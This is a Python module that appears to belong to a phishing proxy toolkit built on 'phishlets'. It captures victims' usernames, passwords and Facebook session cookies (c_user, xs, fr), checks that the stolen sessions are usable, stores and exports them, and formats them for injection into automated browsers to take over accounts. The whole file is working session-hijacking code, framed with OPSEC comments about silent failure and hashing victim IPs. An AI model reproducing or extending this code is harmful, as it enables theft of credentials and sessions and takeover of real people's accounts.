"""
Session Token Capture and Validation
Source: plan-aligned-implementation-protocol.md Lines 635-797
OPSEC: Silent failure, validate minimum tokens before storage
"""

import hashlib
import json
import re
from datetime import datetime
from typing import Dict, List, Optional, Set
from dataclasses import dataclass, asdict

from .phishlet import Phishlet


@dataclass
class CapturedSession:
    """Captured session data structure"""
    id: str
    phishlet: str
    username: Optional[str]
    password: Optional[str]
    tokens: Dict[str, str]
    victim_ip: str
    user_agent: str
    timestamp: str
    location: Dict[str, str]
    
    def to_dict(self) -> dict:
        return asdict(self)
    
    def to_json(self) -> str:
        return json.dumps(self.to_dict())


# Facebook-specific token requirements (per REC-007)
FACEBOOK_REQUIRED_TOKENS = {'c_user', 'xs'}
FACEBOOK_RECOMMENDED_TOKENS = {'fr'}
FACEBOOK_OPTIONAL_TOKENS = {'datr', 'sb', 'wd'}

# Minimum tokens required for valid session capture
MINIMUM_TOKENS = {
    'facebook': FACEBOOK_REQUIRED_TOKENS,
}


class SessionCapture:
    """
    Session token capture and validation
    Source: plan.md Section 3.2, Lines 111-140
    """
    
    def __init__(self):
        self.sessions: List[CapturedSession] = []
        self._session_cache: Dict[str, CapturedSession] = {}
    
    def extract_tokens(self, response: dict, phishlet: Optional[Phishlet]) -> Optional[CapturedSession]:
        """
        Extract session tokens from HTTP response
        Source: plan.md Section 4.3, Lines 248-250
        
        Args:
            response: HTTP response dict with cookies, headers
            phishlet: Active phishlet configuration
            
        Returns:
            CapturedSession if minimum tokens found, None otherwise
        """
        if not response or not phishlet:
            return None
        
        try:
            # Extract cookies from response headers
            cookies = self._parse_cookies(response)
            
            if not cookies:
                return None
            
            # Get required token keys from phishlet
            required_keys = set()
            for auth_token in phishlet.auth_tokens:
                required_keys.update(auth_token.keys)
            
            # Check if minimum required tokens are present
            if not self._validate_tokens(cookies, phishlet.name):
                return None
            
            # Filter to only capture tokens specified in phishlet
            captured_tokens = {}
            for key in required_keys:
                if key in cookies:
                    captured_tokens[key] = cookies[key]
            
            if not captured_tokens:
                return None
            
            # Generate session ID
            session_id = self._generate_session_id(captured_tokens)
            
            # Create captured session
            session = CapturedSession(
                id=session_id,
                phishlet=phishlet.name,
                username=response.get('captured_username'),
                password=response.get('captured_password'),
                tokens=captured_tokens,
                victim_ip=self._hash_ip(response.get('client_ip', '')),
                user_agent=response.get('user_agent', ''),
                timestamp=datetime.utcnow().isoformat(),
                location=response.get('location', {})
            )
            
            # Cache and store
            self._session_cache[session_id] = session
            self.sessions.append(session)
            
            return session
            
        except Exception:
            return None  # Silent failure
    
    def _validate_tokens(self, tokens: Dict[str, str], phishlet_name: str) -> bool:
        """
        Validate that minimum required tokens are present
        Source: plan.md Section 3.2, Lines 133-140
        
        Args:
            tokens: Dictionary of captured cookies
            phishlet_name: Name of the phishlet to validate against
            
        Returns:
            bool: True if minimum tokens present
        """
        if phishlet_name not in MINIMUM_TOKENS:
            # Unknown phishlet - accept any tokens
            return bool(tokens)
        
        required = MINIMUM_TOKENS[phishlet_name]
        captured_keys = set(tokens.keys())
        
        # Check if all required tokens are present
        return required.issubset(captured_keys)
    
    def _parse_cookies(self, response: dict) -> Dict[str, str]:
        """Parse cookies from response headers"""
        cookies = {}
        
        try:
            # Check direct cookies dict
            if 'cookies' in response:
                cookies.update(response['cookies'])
            
            # Parse Set-Cookie headers
            headers = response.get('headers', {})
            set_cookie = headers.get('Set-Cookie', headers.get('set-cookie', ''))
            
            if isinstance(set_cookie, list):
                for cookie_str in set_cookie:
                    name, value = self._parse_cookie_string(cookie_str)
                    if name:
                        cookies[name] = value
            elif set_cookie:
                name, value = self._parse_cookie_string(set_cookie)
                if name:
                    cookies[name] = value
                    
        except Exception:
            pass
        
        return cookies
    
    def _parse_cookie_string(self, cookie_str: str) -> tuple:
        """Parse a single cookie string to extract name and value"""
        try:
            # Format: name=value; path=/; domain=.facebook.com; ...
            if '=' not in cookie_str:
                return None, None
            
            parts = cookie_str.split(';')[0]
            name, value = parts.split('=', 1)
            return name.strip(), value.strip()
        except Exception:
            return None, None
    
    def _generate_session_id(self, tokens: Dict[str, str]) -> str:
        """Generate unique session ID from tokens"""
        token_str = json.dumps(tokens, sort_keys=True)
        return hashlib.sha256(token_str.encode()).hexdigest()[:12]
    
    def _hash_ip(self, ip: str, salt: str = 'evilpanel_session') -> str:
        """
        Hash IP address for OPSEC compliance
        Never store plaintext victim IPs
        """
        if not ip:
            return ''
        return hashlib.sha256(f"{salt}{ip}".encode()).hexdigest()[:16]
    
    def get_session(self, session_id: str) -> Optional[CapturedSession]:
        """Get session by ID from cache"""
        return self._session_cache.get(session_id)
    
    def get_sessions_by_phishlet(self, phishlet_name: str) -> List[CapturedSession]:
        """
        Get all sessions for a specific phishlet
        Source: plan.md Task 2.2
        """
        return [s for s in self.sessions if s.phishlet == phishlet_name]
    
    def get_recent_sessions(self, limit: int = 50) -> List[CapturedSession]:
        """Get most recent sessions"""
        return sorted(
            self.sessions, 
            key=lambda s: s.timestamp, 
            reverse=True
        )[:limit]
    
    def export_sessions_json(self, filepath: str) -> bool:
        """
        Export all sessions to JSON file
        Source: plan.md Task 2.2
        
        Args:
            filepath: Output file path
            
        Returns:
            bool: True if export successful
        """
        try:
            data = {
                'sessions': [s.to_dict() for s in self.sessions],
                'exported_at': datetime.utcnow().isoformat(),
                'count': len(self.sessions)
            }
            
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
            
            return True
        except Exception:
            return False
    
    def import_sessions_json(self, filepath: str) -> int:
        """
        Import sessions from JSON file
        
        Args:
            filepath: Input file path
            
        Returns:
            int: Number of sessions imported
        """
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)
            
            imported = 0
            for session_data in data.get('sessions', []):
                session = CapturedSession(
                    id=session_data['id'],
                    phishlet=session_data['phishlet'],
                    username=session_data.get('username'),
                    password=session_data.get('password'),
                    tokens=session_data['tokens'],
                    victim_ip=session_data['victim_ip'],
                    user_agent=session_data['user_agent'],
                    timestamp=session_data['timestamp'],
                    location=session_data.get('location', {})
                )
                
                if session.id not in self._session_cache:
                    self.sessions.append(session)
                    self._session_cache[session.id] = session
                    imported += 1
            
            return imported
        except Exception:
            return 0
    
    def clear_sessions(self) -> None:
        """Clear all captured sessions"""
        self.sessions.clear()
        self._session_cache.clear()
    
    def get_session_count(self) -> int:
        """Get total session count"""
        return len(self.sessions)
    
    def validate_facebook_session(self, tokens: Dict[str, str]) -> bool:
        """
        Validate Facebook session tokens
        Per REC-007 authoritative token list
        
        REQUIRED: c_user, xs
        RECOMMENDED: fr
        OPTIONAL: datr, sb, wd
        
        Args:
            tokens: Dictionary of captured tokens
            
        Returns:
            bool: True if session is valid for use
        """
        if not tokens:
            return False
        
        token_keys = set(tokens.keys())
        
        # Must have minimum required tokens
        if not FACEBOOK_REQUIRED_TOKENS.issubset(token_keys):
            return False
        
        # Validate token values are not empty
        for key in FACEBOOK_REQUIRED_TOKENS:
            if not tokens.get(key):
                return False
        
        return True
    
    def format_session_for_injection(self, session: CapturedSession) -> List[dict]:
        """
        Format session tokens for browser injection
        
        Args:
            session: Captured session
            
        Returns:
            List of cookie dicts ready for Selenium/Playwright
        """
        cookies = []
        
        for name, value in session.tokens.items():
            cookies.append({
                'name': name,
                'value': value,
                'domain': '.facebook.com',
                'path': '/',
                'secure': True,
                'httpOnly': True
            })
        
        return cookies

